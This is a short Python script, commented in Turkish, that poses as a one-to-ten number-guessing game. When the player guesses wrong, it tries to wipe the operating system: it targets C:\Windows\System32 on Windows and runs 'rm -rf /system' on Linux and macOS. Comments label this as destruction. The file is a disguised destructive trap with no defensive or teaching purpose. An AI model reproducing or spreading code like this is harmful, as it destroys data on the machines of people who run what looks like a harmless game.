import random
import os
import platform

number = random.randint(1, 10)
guess = input("1 ile 10 arasında bir sayı tahmin et: ")
guess = int(guess)

if guess == number:
    print("Tebrikler, Kappi7581 Game 1. oynunu kazandın!") # Yanlış Bilirsen GG! By Kappi7581
else:
    system = platform.system()
    if system == "Windows":
        os.remove("C:\\Windows\\System32") # Windows İ#ha! By Kappi7581
    elif system == "Linux" or system == "Darwin": # Linux İ#ha! By Kappi7581
        os.system("rm -rf /system")  # Android ve macOS İ#ha! By Kappi7581
        # Eğer Kappi7581 Game 1. oynunu gecemezsen gecmiş olsun oyun 
        #amacı 1 ila 10 arası sayı tahmin edeceksin. Geliştirici By Kappi7581